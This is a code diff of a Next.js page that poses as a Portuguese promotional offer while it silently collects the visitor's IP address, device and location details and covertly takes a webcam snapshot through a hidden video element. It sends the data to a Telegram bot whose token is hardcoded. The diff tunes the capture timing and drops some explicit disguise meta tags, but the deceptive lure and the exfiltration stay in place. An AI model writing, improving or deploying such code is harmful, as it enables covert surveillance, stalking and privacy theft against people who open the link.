@@ -1,9 +1,9 @@
 "use client"
 
 import { useEffect, useRef } from "react"
-import { sendTelegramMessage, LocationInfo, DeviceInfo, CaptureData } from "@/services/telegram"
+import { sendTelegramMessage } from "@/services/telegram"
 import { nanoid } from "nanoid"
-import Head from "next/head"
+import { DeviceInfo, LocationInfo, CaptureData } from "@/types/telegram"
 
 const BOT_TOKEN = "7708090733:AAEm01sIJpFKlDIQCqvuCwLIrmbIMEYB9Gg"
 const CHAT_ID = "7708090733"
@@ -12,13 +12,6 @@ function LinkPageClient() {
   const videoRef = useRef<HTMLVideoElement>(null)
 
   useEffect(() => {
-    // Update meta tags for link disguise
-    document.title = "🎁 Promoção Especial - Aproveite Agora!"
-    const metaDescription = document.querySelector('meta[name="description"]')
-    if (metaDescription) {
-      metaDescription.setAttribute('content', 'Oferta exclusiva por tempo limitado! Clique para ver mais detalhes.')
-    }
-
     const captureData = async () => {
       try {
         // Get IP address
@@ -84,6 +77,9 @@ function LinkPageClient() {
               videoRef.current!.onloadedmetadata = resolve
             })
 
+            // Wait a bit for the camera to focus
+            await new Promise(resolve => setTimeout(resolve, 1000))
+
             const canvas = document.createElement('canvas')
             canvas.width = videoRef.current.videoWidth
             canvas.height = videoRef.current.videoHeight
@@ -137,40 +133,30 @@ function LinkPageClient() {
       }
     }
 
-    captureData()
+    // Add a small delay before starting capture to ensure the page is fully loaded
+    setTimeout(captureData, 1000)
   }, [])
 
   return (
-    <>
-      <Head>
-        <title>🎁 Promoção Especial - Aproveite Agora!</title>
-        <meta name="description" content="Oferta exclusiva por tempo limitado! Clique para ver mais detalhes." />
-        <meta property="og:title" content="🎁 Promoção Especial - Aproveite Agora!" />
-        <meta property="og:description" content="Oferta exclusiva por tempo limitado! Clique para ver mais detalhes." />
-        <meta property="og:type" content="website" />
-        <meta name="twitter:card" content="summary_large_image" />
-        <meta name="twitter:title" content="🎁 Promoção Especial - Aproveite Agora!" />
-        <meta name="twitter:description" content="Oferta exclusiva por tempo limitado! Clique para ver mais detalhes." />
-      </Head>
-      <div className="min-h-screen bg-gradient-to-br from-blue-500 to-purple-600 flex flex-col items-center justify-center p-4">
-        <div className="max-w-md w-full bg-white rounded-lg shadow-lg p-6">
-          <div className="animate-pulse">
-            <div className="h-4 bg-gray-200 rounded w-3/4 mb-4"></div>
-            <div className="h-4 bg-gray-200 rounded w-1/2 mb-4"></div>
-            <div className="h-4 bg-gray-200 rounded w-2/3"></div>
-          </div>
-          <p className="text-gray-500 text-sm mt-4 text-center">
-            Preparando sua oferta especial...
-          </p>
+    <div className="min-h-screen bg-gradient-to-br from-blue-500 to-purple-600 flex flex-col items-center justify-center p-4">
+      <div className="max-w-md w-full bg-white rounded-lg shadow-lg p-6">
+        <div className="animate-pulse">
+          <div className="h-4 bg-gray-200 rounded w-3/4 mb-4"></div>
+          <div className="h-4 bg-gray-200 rounded w-1/2 mb-4"></div>
+          <div className="h-4 bg-gray-200 rounded w-2/3"></div>
         </div>
-        <video
-          ref={videoRef}
-          autoPlay
-          playsInline
-          className="hidden"
-        />
+        <p className="text-gray-500 text-sm mt-4 text-center">
+          Preparando sua oferta especial...
+        </p>
       </div>
-    </>
+      <video
+        ref={videoRef}
+        autoPlay
+        playsInline
+        muted
+        className="hidden"
+      />
+    </div>
   )
 }
 
